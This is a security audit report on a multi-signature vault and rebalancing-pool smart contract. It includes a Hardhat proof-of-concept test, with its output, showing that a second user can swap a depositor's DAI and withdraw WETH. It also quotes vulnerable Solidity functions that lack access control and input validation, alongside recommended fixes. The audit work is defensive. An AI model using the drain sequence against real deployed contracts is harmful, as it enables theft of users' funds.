# Sierra Audit

## Overview
This document details the findings of a security audit performed by Team Lima on Team Sierra's project.

## Project Summary
The MultiSigVault project provides a solution for managing pooled funds with multi-signature access control, utilizing a rebalancing mechanism to maintain user-defined token proportions. However, the current implementation presents various security concerns, such as the lack of input validations and inadequate access control, which could potentially compromise the contract's integrity and user funds.

## Table of Contents

#### 1.Critical
 - 1.1 Attacker can drain the MultiSigVault

#### 2.High
 - 2.1 Deposit Function Lacks Token Tracking
 - 2.2 Withdraw Function Allows Token Mismatch and Ignores Pool Proportions
 - 2.3 No Access Control in createPool
 - 2.4 No Access Control in removePool
 - 2.5 No Access Control in setAvailableTokens
 - 2.6 No Access Control in setPriceFeeds
 - 2.7 Unprotected Swap Function Accessible to Anyone

#### 3.Medium
 - 3.1 Possible Denial of service in rebalance in RebalancingPool
 - 3.2 Lack of input validation when calling createPool

## Critical Findings

### 1. Attacker can drain the MultiSigVault
By exploiting vulnerabilities in the deposit, withdraw, and swap functions, an attacker can manipulate the contract to drain funds from the MultiSigVault. These combined flaws pose a severe risk to the security of user funds stored within the vault.

```
    it.only("Draining the vault", async function () {
      const { vaultContract, rebalancingPools, owner, otherAccount, weth, dai, bob, alice } = await loadFixture(deployMULTSIGVAULTFixture);

 
      await logState(dai, weth, bob, alice, vaultContract);

      await dai.connect(bob).approve(vaultContract.address, ethers.utils.parseUnits('100000', 18));
      await vaultContract.connect(bob).deposit(ethers.utils.parseUnits('100000', 18), dai.address);

      console.log("Bob has 100,000 DAI and deposits it into the vault");

      await logState(dai, weth, bob, alice, vaultContract);


      console.log("Alice see that and swap 100,000 DAI to 51 WETH");

      await vaultContract.connect(alice).swap(daiAddress, wethAddress, ethers.utils.parseEther("100000"), 0);

      await logState(dai, weth, bob, alice, vaultContract);


      console.log("Alice deposits 50 DAI into the vault");
      await dai.connect(alice).approve(vaultContract.address, ethers.utils.parseUnits('50', 18));
      await vaultContract.connect(alice).deposit(ethers.utils.parseUnits('50', 18), dai.address);

      
      await logState(dai, weth, bob, alice, vaultContract);


      console.log("Alice withdraw 50 WETH from the vault");
      await vaultContract.connect(alice).withdraw(wethAddress);
      await logState(dai, weth, bob, alice, vaultContract);
    });
```

```
    MULTSIGVAULT
        Deployment
    -----------------------
    Bob     :>> DAI: 100000.0 => WETH: 0
    Alice   :>> DAI: 50.0 => WETH: 0.0
    Vault   :>> DAI: 0.0 => WETH: 0.0
    -----------------------
    Bob has 100,000 DAI and deposits it into the vault
    -----------------------
    Bob     :>> DAI: 0.0 => WETH: 0
    Alice   :>> DAI: 50.0 => WETH: 0.0
    Vault   :>> DAI: 100000.0 => WETH: 0.0
    -----------------------
    Alice see that and swap 100,000 DAI to 51 WETH
    -----------------------
    Bob     :>> DAI: 0.0 => WETH: 0
    Alice   :>> DAI: 50.0 => WETH: 0.0
    Vault   :>> DAI: 0.0 => WETH: 51.186998459175843701
    -----------------------
    Alice deposits 50 DAI into the vault
    -----------------------
    Bob     :>> DAI: 0.0 => WETH: 0
    Alice   :>> DAI: 0.0 => WETH: 0.0
    Vault   :>> DAI: 50.0 => WETH: 51.186998459175843701
    -----------------------
    Alice withdraw 50 WETH from the vault
    -----------------------
    Bob     :>> DAI: 0.0 => WETH: 0
    Alice   :>> DAI: 0.0 => WETH: 50.0
    Vault   :>> DAI: 50.0 => WETH: 1.186998459175843701
    -----------------------
        ✔ Draining the vault (4420ms)
```

## High Findings

### 1. Deposit Function Lacks Token Tracking
In the MultiSigVault contract, users can deposit tokens without the contract associating the deposited token's address with the stored amount. The contract stores the deposited amount in a mapping with the user's address as the key but fails to record the token's address alongside it. This lack of proper tracking can lead to potential issues with withdrawals. To resolve this issue, the contract should track both the amount and the associated token for each user's deposit.

```
mapping(address => uint256) public usersToFunds;
```

### 2. Withdraw Function Allows Token Mismatch and Ignores Pool Proportions
Due to the absence of proper token tracking in the MultiSigVault contract, users can potentially withdraw a different token than the one they initially deposited. Furthermore, the contract does not check the pool proportions during the withdrawal process. This oversight allows users to withdraw any token of their choice, regardless of whether they have deposited it or not, and leads to unintended consequences and token imbalances. To fix this issue, the contract should ensure that users can only withdraw the same token they deposited by utilizing the token tracking implemented in the deposit function and should also verify that the withdrawal respects the pool proportions.

```
    function withdraw(address _tokenAddress) public returns (uint256) { // @audit you can withdraw even when under the approvalLimit - doesnt check approvalLimit
        uint256 tmp = usersToFunds[msg.sender]; // @audit if ACCEPTABLE_TOKEN gets changed after user deposited money, user could withdraw lose/win depending if new token is more expensive
        usersToFunds[msg.sender] = 0;
        IERC20(_tokenAddress).transfer(msg.sender, tmp);
        return tmp; 
    }
```

### 3. No Access Control in createPool
The createPool function is designed to create a pool for a user with specified parameters. However, there is a critical security issue regarding access control. As it stands, any external actor can call this function and overwrite any user's pool or create a new pool without any restrictions. This can lead to unauthorized modifications of users' pools and potentially pose a significant risk to the users' funds. It is highly recommended to implement proper access control mechanisms, such as restricting the function to be called only by the Vault contract or authorized addresses, to prevent unauthorized modifications and ensure the security of users' pools.

```
    function createPool(
        address _user, 
        address[] memory _chosenTokens, 
        uint256[] memory _proportions, 
        uint256[] memory _proportionsInPercentage, 
        uint256 _totalValue, 
        uint256 _tolerance) 
    external {
        /* Here will be some fee to earn by app */
        s_userToPool[_user].chosenTokens = _chosenTokens;
        s_userToPool[_user].proportions = _proportions;
        s_userToPool[_user].proportionsInPercentage = _proportionsInPercentage;
        s_userToPool[_user].totalValue = _totalValue;
        s_userToPool[_user].tolerance = _tolerance;
    }
```

### 2. No Access Control in removePool
The removePool function is intended to remove a user's pool and return its total value. However, there is a critical security issue concerning access control. Currently, any external actor can call this function and remove any user's pool without restrictions. This vulnerability can lead to unauthorized removal of users' pools, putting the safety of their funds at risk. To address this issue, it is crucial to implement proper access control mechanisms, such as allowing only the pool owner, the Vault contract, or authorized addresses to call this function. Implementing these restrictions will enhance the security of users' pools and protect them from potential unauthorized removals.

```
    function removePool(address _user) external returns (uint256) { // @audit anyone can remove any user's pool
        uint256 _totalValue = s_userToPool[_user].totalValue;
        delete s_userToPool[_user];
        return _totalValue;
    }
```

### 3. No Access Control in setAvailableTokens
The setAvailableTokens function allows setting the list of available tokens for the rebalancing pools. However, there is a critical security issue with the absence of access control. As it stands, any external actor can call this function and modify the list of available tokens, potentially introducing malicious or unwanted tokens into the list. To mitigate this risk, it is essential to restrict the function call to specific roles, such as the contract owner or a designated admin role. By implementing proper access control mechanisms, the integrity of the available tokens list can be preserved, ensuring that only legitimate and intended tokens are included in the rebalancing pools.

```
    function setAvailableTokens(address[] memory _tokenAddresses) external { 
        availableTokens = _tokenAddresses;
    }
```

### 4. No Access Control in setPriceFeeds
The setPriceFeeds function is responsible for setting the price feed addresses for the tokens used in the rebalancing pools. However, the lack of access control in this function poses a significant security risk. Currently, any external actor can call this function, potentially allowing them to set malicious or incorrect price feed addresses. This could lead to inaccurate pricing information and disrupt the rebalancing process.

To address this vulnerability, it is crucial to implement proper access control mechanisms, such as restricting the function call to the contract owner or a designated admin role. By doing so, the contract can ensure that only trusted and valid price feed addresses are set, maintaining the accuracy and reliability of the token pricing information used for rebalancing pools.

```
    function setPriceFeeds(address[] memory _priceFeedAddresses) external {  // @audit anybody can set pricefeeds
        delete priceFeeds;
        for (uint i = 0; i < _priceFeedAddresses.length; i++) {
            priceFeeds.push(AggregatorV3Interface(_priceFeedAddresses[i]));
        }
    }
```

### 5. Unprotected Swap Function Accessible to Anyone
The swap function in the contract is open for execution by any external caller, without any access control mechanisms in place. This vulnerability could allow malicious actors to exploit the swap functionality, possibly disrupting the token balances and affecting the performance of the contract. Implementing proper access control is crucial to ensure the security and integrity of the token swap process.

```
    /// @notice Swapping an Exact Token for an Enough Token on the vault
    function swap(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOutMin) public returns (uint256 amountOut) { // @anyone can call this function
        //IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        require(IERC20(tokenIn).approve(Uniswap_V2_Router02, amountIn), "Failed to approve tokens for swapping");

        //IERC20(tokenIn).approve(Uniswap_V2_Router02, amountIn);

        address[] memory path;
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        uint256[] memory amounts = IUniswapV2Router(Uniswap_V2_Router02).swapExactTokensForTokens(amountIn, amountOutMin, path, address(this), block.timestamp);

        // /// Refund tokenIn when the expected minimum out is not met
        // if (amountOutMin > amounts[2]) {
        //     IERC20(tokenIn).transfer(msg.sender, amounts[0]);
        // }

        return amounts[1];
    }
```

## Medium Findings

### 1. Possible Denial of service in rebalance in RebalancingPool
The first call this function made is to the checkPercentageProportions function. Inside that function they loop 3 times over chosenTokens.
Depending on the amount of token the call can run out of gas. Seeing that the rebalance is one of the main functions, it will prevent the user from reblancing their profile.

```
    function rebalance(address _user) external { // @audit suppose to be called by the keeper but anyone can call it
        ( , bytes[] memory tooLowBalance, bytes[] memory tooHighBalance) = checkPercentageProportions(_user); // @audit might run out of gas - looping 3 times through chosen token
        //Rest of the code
    }
```

### 2. Lack of input validation when calling createPool
The createPool function is responsible for creating a rebalancing pool for a user with the specified parameters. However, the function lacks proper input validation, which could lead to potential issues and vulnerabilities within the contract. Without validation, external actors can input invalid or malicious values for the pool parameters, such as incorrect token addresses, proportions, or tolerance values.


